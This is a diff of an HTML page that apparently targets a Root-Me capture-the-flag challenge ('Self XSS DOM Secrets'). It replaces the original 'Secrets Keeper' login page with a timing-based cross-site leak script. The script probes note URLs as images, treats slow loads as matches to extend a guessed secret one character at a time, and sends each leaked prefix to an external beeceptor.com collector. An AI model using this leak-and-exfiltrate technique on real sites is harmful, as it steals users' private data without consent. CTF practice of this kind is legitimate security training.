@@ -1,173 +1,48 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Self XSS DOM Secrets - Secrets Keeper</title>
-
-    <link rel="icon" type="image/png" href="/static/images/rootme.png">
-    
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=Azeret+Mono:wght@300&display=swap');
-
-        *, html, body, table, tr, td, frame { 
-            margin: 0; 
-            padding: 0;
-        }
-
-        html, body { 
-            height: 100%;
-        }
-
-        body {
-            font-family: 'Azeret Mono', monospace;
-            font-size: 15px;
-            line-height: 1.42857;
-            color: #767676;
-            background: #edecec;
-            height: calc(100vh - 82px);
-            position: relative;
-            padding: 82px 40px 0 40px !important;
-        }
-
-        a {color: #2ba6cb; text-decoration: none;}
-        a:hover { cursor: pointer; }
-        a:hover, a:focus { color: #258faf; }
-
-        button {
-            background-color: white;
-            border-radius: 6px;
-            border: 1px solid #dcdcdc;
-            cursor: pointer;
-            color: #767676;
-            font-weight: bold;
-            padding: 6px 24px;
-        }
-        button:hover { background-color: #f9f9f9; }
-
-        fieldset { padding: 5px 10px; }
-        fieldset legend { padding: 0 5px; }
-
-        h1, p, legend, form, div { text-align: center; }
-
-        input, textarea {
-            text-align: center;
-            border-radius: 10px;
-            padding: 5px;
-            border: 5px;
-        }
-
-        textarea {
-            width: 40%;
-            height: 150px;
-        }
-
-        table, th, td {
-            border: 1px solid #767676;
-            border-collapse: separate;
-            margin-left: auto;
-            margin-right: auto;
-            width: 400px;
-        }
-        table { border-radius: 6px; }
-        td { height: 200px; }
-
-        iframe {
-            width: 40%; 
-            height: 150px;
-            border: 1px solid #767676;
-        }
-
-        /* ** Upload ** */
-
-        .drop-zone {
-            background-color: #C8DADF;
-            margin-right: auto;
-            margin-left: auto;
-            padding: 10px;
-            width: 30%;
-        }
-
-        .drop-zone-line {
-            border-style: dotted;
-        }
-
-        .pb-1 { padding-bottom: 20px; }
-        .mgt-1 { margin-top: 20px; }
-        .mgt-2 { margin-top: 40px; }
-        .mgb-1 { margin-bottom: 20px; }
-        .mgb-2 { margin-bottom: 40px; }
-
-        .center { text-align: center; }
-        .center-img { text-align: center; margin: auto; display: flex; }  
-        img { display: block; }
-
-        .hr-message {
-            margin: auto;
-            width: 30%;
-        }
-    </style>
 </head>
 <body>
-<h1>Secrets Keeper</h1>
+<script>const chars = 'abcdefghijklmnopqrstuvwxyz0123456789_', base = 'https://web-client-ch56.challenge01.root-me.org:58056/notes/';
+let id = 0;
 
-<div style="display: flex; margin: auto; text-align: center; justify-content: center;">
-    <p>
-        <a href="/login">Login</a> | <a href="/profile">Profile</a> | <a href="/report">Report</a>
-    </p>
-</div>
+async function findValidUrl() {
+    while (true) {
+        let url = base + id;
+        let start = Date.now();
+        let img = new Image();
 
-<hr class="mgb-2">
-<div style="display: flex; margin: auto; text-align: center; justify-content: center;">
-    <fieldset style="width: 50%">
-        <legend>Login</legend>
-        <form method="POST" action="/login" id="loginForm">
-            <label>Username</label><br>
-            <input id="username" class="mgb-1" name="username" oninput="fieldModified('username')"><br>
-            <label>Secret</label><br>
-            <input id="secret" class="mgb-1" name="secret" oninput="fieldModified('secret')"><br>
-            <button class="mgb-1" type="submit" onclick="submitForm(event)">Login</button>
-        </form>
-    </fieldset>
-</div>
+        img.onload = img.onerror = () => {
+            let duration = Date.now() - start;
+            if (duration < 2000) return console.log("URL valide :", url);//, noteSearch(url + "/");
+        };
 
-<script>
-const characters = 'abcdefghijklmnopqrstuvwxyz0123456789_';
+        img.src = url;
+        await new Promise(r => setTimeout(r, 100)); // Wait before next request
+        id++;
+    	if(id > 100) break;
+    }
+}
 
 function makeRequest(url, added) {
+    let start = Date.now();
+    let img = new Image();
 
-    function interpretResult() {
-            const endTime = Date.now();
-            const duration = endTime - startTime;
+    img.onload = img.onerror = () => {
+        let duration = Date.now() - start;
+        if (duration > 2000) {
+            fetch("https://rootmeleak2.free.beeceptor.com/" + added);
+            console.log("Lente :", url);
+            chars.split('').forEach(c => makeRequest(url + c, added + c));
+        }
+    };
 
-            if (duration > 2000) {
-             	fetch("https://rootmeleak.free.beeceptor.com/" + added);
-		console.log(`Requête trop lente : ${url}`);
-                
-		let i = 0;
-                while(i < characters.length) {
-                    const newChar = characters[i];
-                    const newUrl = url + newChar;
-                    makeRequest(newUrl, added + newChar);
-		    i+=1;
-                }
-            }
-    }
-
-    const startTime = Date.now();
-
-    fetch(url)
-        .then(response => response.text())
-        .then(data => interpretResult())
-        .catch(error => interpretResult());
+    img.src = url;
 }
 
-const baseUrl = 'https://web-client-ch56.challenge01.root-me.org:58056/notes/2278/';
+function noteSearch(url) { chars.split('').forEach(c => makeRequest(url + c, c)); }
 
-for (let char of characters) {
-    const newUrl = baseUrl + char;
-    makeRequest(newUrl, char);
-}
+findValidUrl();
 </script>
     
 </body>
